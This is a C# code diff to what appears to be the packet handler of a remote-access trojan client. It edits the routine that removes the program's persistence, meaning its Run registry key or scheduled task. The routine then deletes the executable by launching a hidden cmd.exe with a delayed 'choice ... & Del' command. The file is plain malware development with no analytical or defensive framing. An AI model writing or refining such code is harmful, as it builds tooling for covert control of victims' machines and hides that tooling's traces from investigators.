@@ -7,6 +7,7 @@ using System.IO;
 using System.Linq;
 using System.Security.Principal;
 using System.Text;
+using System.Windows.Forms;
 
 namespace Client.Handle_Packet
 {
@@ -19,13 +20,13 @@ namespace Client.Handle_Packet
                 try
                 {
                     if (!Methods.IsAdmin())
-                        Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").DeleteValue(Settings.InstallFile);
+                        Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteValue(Settings.InstallFile);
                     else
                     {
                         Process.Start(new ProcessStartInfo()
                         {
                             FileName = "schtasks",
-                            Arguments = $"/delete /tn {Settings.InstallFile} /f",
+                            Arguments = $"/delete /f /tn \"" + Settings.InstallFile + "\"",
                             CreateNoWindow = true,
                             ErrorDialog = false,
                             UseShellExecute = false,
@@ -40,11 +41,10 @@ namespace Client.Handle_Packet
             {
                 Del = new ProcessStartInfo()
                 {
-                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
+                    FileName = "cmd.exe",
+                    Arguments = "choice /C Y /N /D Y /T 2 & Del \"" + Application.ExecutablePath + "\"",
                     WindowStyle = ProcessWindowStyle.Hidden,
                     CreateNoWindow = true,
-                    UseShellExecute = false,
-                    FileName = "cmd.exe"
                 };
             }
             catch { }
